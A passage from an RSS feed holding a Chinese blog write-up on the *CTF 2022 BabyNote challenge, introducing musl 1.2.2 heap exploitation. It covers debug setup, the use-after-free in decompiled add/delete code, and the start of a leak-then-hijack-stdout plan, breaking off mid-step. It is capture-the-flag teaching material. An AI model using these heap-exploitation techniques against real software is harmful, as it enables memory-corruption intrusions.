class=&#34;admonition-content&#34;&gt;人类的智慧就包含在这五个字里面：“等待和希望！”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;其实，往事就如同旅途的景色，随着岁月的流逝，是会在记忆中淡忘的。我现在的情形，就好比那些在梦中受伤的人，他们看到了伤口也感到了疼痛，可就是想不起自己曾经受过伤。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>通过*ctf2022_babynote入门musl pwn</title>
      <link>http://localhost:1313/posts/musl_pwn/</link>
      <pubDate>Sat, 10 Jan 2026 02:01:48 +0800</pubDate>
      <guid>http://localhost:1313/posts/musl_pwn/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;p&gt;&lt;del&gt;看到&lt;code&gt;hkcertctf&lt;/code&gt;出了一道&lt;code&gt;musl&lt;/code&gt;的题来学习一下&lt;/del&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;前言&#34;&gt;&lt;span&gt;前言&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%89%8d%e8%a8%80&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;基础知识部分就不详细列出了，列出一些我的参考文章。&lt;del&gt;其实主要还是看源码&lt;/del&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://9anux.org/2024/01/17/musl/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;io板子&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-269533.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;源码分析&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-274640-1.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;主要参考文章：小小做题家之musl1.2.2的利用手法&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;利用手法：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;dequeue：用于任意地址写&lt;/li&gt;&#xA;&lt;li&gt;queue：把&lt;code&gt;fake_meta&lt;/code&gt;链入&lt;code&gt;active&lt;/code&gt;链表，从而进行任意地址的堆块分配&lt;/li&gt;&#xA;&lt;li&gt;IO：有通过&lt;code&gt;puts&lt;/code&gt;和&lt;code&gt;exit&lt;/code&gt;触发的&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;环境配置&#34;&gt;&lt;span&gt;环境配置&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;编译libc&#34;&gt;&lt;span&gt;编译&lt;code&gt;libc&lt;/code&gt;&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%bc%96%e8%af%91libc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;拿到题目的&lt;code&gt;musl libc&lt;/code&gt;版本之后，最好自己编译一个&lt;code&gt;musl libc&lt;/code&gt;，使用自己编译的&lt;code&gt;libc&lt;/code&gt;启动题目有符号表能支持调试（有的题目给的&lt;code&gt;libc&lt;/code&gt;没有符号表就调试不了），调试的时候还能看到&lt;code&gt;musl&lt;/code&gt;的源码知道哪里出错了&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;查看&lt;code&gt;musl libc&lt;/code&gt;版本：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;./libc.so&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/kraj/musl.git&#xA;cd musl&#xA;git checkout v1.2.2&#xA;CFLAGS=&amp;#34;-g -O0&amp;#34; ./configure --prefix=$PWD/install&#xA;make -j$(nproc)&#xA;make install&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样&lt;code&gt;musl/install/lib&lt;/code&gt;下就有没去符号表的&lt;code&gt;libc.so&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;启动题目&#34;&gt;&lt;span&gt;启动题目&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%90%af%e5%8a%a8%e9%a2%98%e7%9b%ae&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter ../musl-libc/v1.2.2 ./pwn&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后exp中直接&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;p = process(&amp;#34;./pwn&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;即可&lt;/p&gt;&#xA;&lt;p&gt;如果没有&lt;code&gt;patchelf&lt;/code&gt;，通过&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;./libc.so ./pwn&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动，会有点问题（虽然也不是不行）&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;调试&#34;&gt;&lt;span&gt;调试&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;sudo apt install musl-dbgsym&#xA;git clone https://github.com/xf1les/muslheap.git  &#xA;echo &amp;#34;source /path/to/muslheap.py&amp;#34; &amp;gt;&amp;gt; ~/.gdbinit&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;命令&lt;/th&gt;&#xA;          &lt;th&gt;作用&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mheap&lt;/td&gt;&#xA;          &lt;td&gt;可以查看&lt;code&gt;__malloc_context&lt;/code&gt;的部分信息，可以详细看到每一条&lt;code&gt;meta&lt;/code&gt;链表&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x __malloc_context&lt;/td&gt;&#xA;          &lt;td&gt;可以查看&lt;code&gt;__malloc_context&lt;/code&gt;的详细信息，但无法详细看到每一条&lt;code&gt;meta&lt;/code&gt;链表&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mmagic&lt;/td&gt;&#xA;          &lt;td&gt;用于查看关键函数的地址&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x &lt;em&gt;(struct meta&lt;/em&gt;) &amp;lt;meta地址&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看某个&lt;code&gt;meta&lt;/code&gt;结构体的详细信息&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x &lt;em&gt;(struct group&lt;/em&gt;) &amp;lt;group地址&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看&lt;code&gt;group&lt;/code&gt;结构体详细信息&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mchunkinfo &lt;addr&gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看某个用户指针所属 &lt;code&gt;slot &lt;/code&gt;的详细信息&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mfindslot  &lt;addr&gt;&lt;/td&gt;&#xA;          &lt;td&gt;从任意地址反向定位其所在 &lt;code&gt;slot&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x stdout&lt;/td&gt;&#xA;          &lt;td&gt;查看&lt;code&gt;stdout&lt;/code&gt;结构体&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x &lt;em&gt;(struct meta_area&lt;/em&gt;) &amp;lt;meta_area address&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看&lt;code&gt;meta_area&lt;/code&gt;，&lt;code&gt;meta &amp;amp; 0xffffffffffff000&lt;/code&gt;就能找到&lt;code&gt;meta_arena&lt;/code&gt;结构体&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;&lt;del&gt;后记&lt;/del&gt; 原来pwndbg中有调试musl的命令，&lt;a href=&#34;https://pwndbg.re/stable/commands/musl/mallocng-dump/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;pwndbg_docs&lt;/a&gt;&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;ctf星ctfbabynote&#34;&gt;&lt;span&gt;*CTF（星CTF）——Babynote&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ctf%e6%98%9fctfbabynote&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/sixstars/starctf2022/tree/main/pwn-BabyNote&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/sixstars/starctf2022/tree/main/pwn-BabyNote&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;逆向分析，略。。。&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;漏洞&#34;&gt;&lt;span&gt;漏洞&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%bc%8f%e6%b4%9e&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;add&lt;/code&gt;的时候，把&lt;code&gt;global_note&lt;/code&gt;给了&lt;code&gt;heap_ptr[4]&lt;/code&gt;，&lt;code&gt;delete&lt;/code&gt;的时候，没有把&lt;code&gt;heap_ptr[4]&lt;/code&gt;中的&lt;code&gt;global_note&lt;/code&gt;置0，存在&lt;code&gt;UAF&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;int __fastcall add(struct _IO_FILE *stderr)&#xA;{&#xA;  __int64 *heap_ptr; // [rsp&amp;#43;8h] [rbp-8h]&#xA;&#xA;  heap_ptr = (__int64 *)calloc(1u, 0x28u);&#xA;  heap_ptr[2] = create_name(heap_ptr);&#xA;  heap_ptr[3] = create_note(heap_ptr &amp;#43; 1);&#xA;  heap_ptr[4] = global_note;&#xA;  global_note = (__int64)heap_ptr;&#xA;  return puts(&amp;#34;ok&amp;#34;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;unsigned __int64 __fastcall delete(struct _IO_FILE *stderr)&#xA;{&#xA;  // ...&#xA;  ptr_1 = 0;&#xA;  size = create_name((__int64 *)&amp;amp;ptr_1);&#xA;  ptr = (void *)find_name(ptr_1, size);&#xA;  if ( ptr )&#xA;  {&#xA;    if ( ptr != (void *)global_note || *(_QWORD *)(global_note &amp;#43; 0x20) )// 要删除的是中间或末尾节点&#xA;    {&#xA;      if ( *((_QWORD *)ptr &amp;#43; 4) )&#xA;      {                                         // 遍历链表找到指向ptr的前一个节点的next指针位置&#xA;        for ( p_global_note = &amp;amp;global_note; ptr != (void *)*p_global_note; p_global_note = (__int64 *)(*p_global_note &amp;#43; 32) )&#xA;          ;&#xA;        *p_global_note = *((_QWORD *)ptr &amp;#43; 4);  // 更新前一个节点的next指针，从链表中移除ptr&#xA;      }&#xA;    }&#xA;    else&#xA;    {&#xA;      global_note = 0;                          // 要删除的是头节点且没有后继节点&#xA;    }&#xA;    free(*(void **)ptr);                        // 释放name指针&#xA;    free(*((void **)ptr &amp;#43; 1));                  // 释放note_content指针&#xA;    free(ptr);                                  // 释放节点本身&#xA;    puts(&amp;#34;ok&amp;#34;);&#xA;  }&#xA;  else&#xA;  {&#xA;    puts(&amp;#34;oops.....&amp;#34;);&#xA;  }&#xA;  free(ptr_1);&#xA;  // ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;流程&#34;&gt;&lt;span&gt;流程&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%b5%81%e7%a8%8b&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;整体流程可以分为这三步：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;泄露&lt;code&gt;elfbase&lt;/code&gt;、&lt;code&gt;libc_base&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;泄露&lt;code&gt;secret&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;把堆块申请在&lt;code&gt;stdout&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;第一步&#34;&gt;&lt;span&gt;第一步&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%ac%ac%e4%b8%80%e6%ad%a5&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;在前面两步泄露地址中，只需要关注&lt;code&gt;active[2]&lt;/code&gt;这个链表（0x30大小）&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;add&lt;/code&gt;一次，申请一个&lt;code&gt;0x30&lt;/code&gt;大小的&lt;code&gt;note1&lt;/code&gt;，来防止&lt;code&gt;free&lt;/code&gt;掉&lt;code&gt;group&lt;/code&gt;中所有&lt;code&gt;chunk&lt;/code&gt;时，将整个&lt;code&gt;group&lt;/code&gt;归还给堆管理器&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;接下来需要注意，&lt;code&gt;group&lt;/code&gt;对&lt;code&gt;chunk&lt;/code&gt;的管理策略：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;malloc&lt;/code&gt;的时候取的是&lt;code&gt;avail_mask&lt;/code&gt;中最低位的堆块，也就是一个&lt;code&gt;group&lt;/code&gt;中最低地址的堆块&lt;/li&gt;&#xA;&lt;li&gt;被&lt;code&gt;free&lt;/code&gt;掉的堆块，会把它的&lt;code&gt;free_mask&lt;/code&gt;置1，&lt;code&gt;avail_mask&lt;/code&gt;不动还是0&lt;/li&gt;&#xA;&lt;li&gt;当一个&lt;code&gt;group&lt;/code&gt;中没有&lt;code&gt;avail&lt;/code&gt;堆块时，会把被&lt;code&gt;free&lt;/code&gt;的堆块标记成&lt;code&gt;avail&lt;/code&gt;，&lt;code&gt;free_mask&lt;/code&gt;就置0了&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;接着把&lt;code&gt;note2&lt;/code&gt;申请到&lt;code&gt;active[2]&lt;/code&gt;的第十个&lt;code&gt;chunk&lt;/code&gt;的位置，&lt;code&gt;note2_content&lt;/code&gt;申请到第二个的位置&lt;/p&gt;&#xA;&lt;p&gt;申请&lt;code&gt;note3&lt;/code&gt;，并把&lt;code&gt;note2&lt;/code&gt;给&lt;code&gt;free&lt;/code&gt;掉，此时&lt;code&gt;note3&lt;/code&gt;还记录着&lt;code&gt;note2&lt;/code&gt;的位置即第十个&lt;code&gt;chunk&lt;/code&gt;的位置&lt;/p&gt;&#xA;&lt;p&gt;接着在&lt;code&gt;note2_content&lt;/code&gt;的位置申请&lt;code&gt;note4&lt;/code&gt;，泄露出&lt;code&gt;note4&lt;/code&gt;记录的两个堆地址&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;musl申请的堆块，有的大小能泄露elfbase，有的能泄露libc&lt;/div&gt;&#xD;&#xA;    